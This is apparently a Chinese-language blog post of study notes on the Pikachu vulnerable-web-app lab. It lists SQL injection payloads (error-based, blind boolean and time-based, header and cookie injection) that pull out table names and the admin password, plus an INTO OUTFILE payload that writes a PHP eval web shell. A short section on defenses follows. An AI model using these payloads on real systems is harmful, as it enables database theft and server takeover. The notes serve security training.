---
title: pikachu
date: 2022-11-27 14:40:40
tags:
---
一、SQL：
1、数字型：
    抓包然后将id=1改成id=1 or 1=1;
2、字符型：
    构造闭合payload,输入：'or 1=1;#

    实战update：
        第一步：kobe' and updatexml(1,version(),0)#
        第二步：kobe' and updatexml(1,concat(0x7e,version()),0)#   得到版本号，其中0x7e是波浪号的16进制，这里也可以用其他符号，主要作用是防止报错信息被过滤。concat的功能是将括号内的两个字符串合并成一个字符串。
                kobe' and updatexml(1,concat(0x7e,database()),0)#
        第三步：kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#      报错一次只能显示一行，所以我们可以使用limit一次一次进行获取表名。
                kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),0)#
                获取到表名后再获取列名，思路同上。
                kobe' and updatexml(1,concat(0x7e,(select column_name from information_schema.column where table_schema='pikachu' limit 0,1)),0)#
                然后获取数据。
                kobe' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#
                kobe' and updatexml(1,concat(0x7e,(select password from users where username='admin' limit 0,1)),0)#
    实战extract:
        将update中的updatexml()函数替换成ExtractValue()函数即可
    实战float：
        kobe' and (select count(*),concat(select password from users where username='admin' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#
3、搜索型：
    xxx%' or 1=1#
4、xx型：
    xx') or 1=1#
5、insert/update注入：
    ' or updatexml(1,concat(0x7e,database()),0) or '
6、delete注入：
    用BP工具包抓包，然后将其中的id改成这段命令：
    1 or updatexml(1,concat(0x7e,database()),0)
    然后将这段命令用URL编码进行编写最后返回浏览器。
7、Http Header注入：
    使用BP工具包进行抓包，然后再在数据头Header中进行测试看看有没有SQL漏洞（将cookie和useragent数据改成单引号'或双引号"看会不会报错）
    user agent:' or updatexml(1,concat(0x7e,database()),0) or '
    cookie:ant[uname]=admin' and updatexml(1,concat(0x7e,database()),0)#; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=56ta7rpkvoff089bo65s8sl5mc
8、基于布尔值的SQL盲注：
    <img src="/images/盲注1.jpg" width="50%" height="50%"/>
    <img src="/images/盲注2.jpg" width="50%" height="50%"/>
    select length(database());       这个可以返回字段长度。如下：
    <img src="/images/盲注3.jpg" width="50%" height="50%"/>
    然后就可以用这个命令来判断返回字段中逐个字母为多少了，具体原理如下：
    <img src="/images/盲注4.jpg" width="50%" height="50%"/>
    基于以上基础知识，我们可以构造出payload：
    kobe' and ascii(substr(database(),1,1))=112#
    并且我们可以更进一步，将上面的database()更改为：(select table_name from information_schema.tables where table_schema = database() limit 0,1)
    kobe' and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))<112#
9、基于时间的SQL盲注：
    <img src="/images/盲注5.jpg" width="50%" height="50%"/>
    点击F12打开web控制台，点击网络(network)选项,随后使用payload: kobe' and sleep(5)#
    随后可以看到控制台上网页过了5000ms才反应。
    <img src="/images/盲注6.jpg" width="50%" height="50%"/>
    kobe' and if((substr(database(),1,1))='p',sleep(5),null)#
10、一句话木马：
    <img src="/images/一句话.jpg" width="50%" height="50%"/>
    使用show global variables like '%secure%';这个命令可以查看secure_file_priv服务是否从null转变为空了。
    构建payload：
    kobe' union select "<?php @eval($_GET['test'])?>",2 into outfile "/var/www/html/1.php"#
    但不清楚怎么获取远程目录和如何编写远程目录，并且MySQL开启secure_file_priv的服务也不清楚，后续再解决。
11、基于盲注的暴力破解(用字符型注入来做演示)：
    破解表名的payload: kobe' and exists(select * from aa)#
    破解列名的payload: kobe' and exists(select id from users)#
    首先将payload输入，随后使用BP工具包抓包，最后再找到要暴力破解的字段，导入字典进行暴力破解！
12、SQL注入常见防范措施：
    代码层面：
        1、对输入进行严格的转义和过滤；
        <img src="/images/防范1.jpg" width="50%" height="50%"/>
        2、使用预处理和参数化。
        <img src="/images/防范2.jpg" width="50%" height="50%"/>
    网路层面：
        1、云端防护(阿里云盾或360网站卫士等)；
        2、通过waf设备启用防SQL注入的策略(或类似防护系统)。
        <img src="/images/防护3.jpg" width="50%" height="50%"/>
        现在除了常规的waf外，还有云waf
        <img src="/images/防护4.jpg" width="50%" height="50%"/>
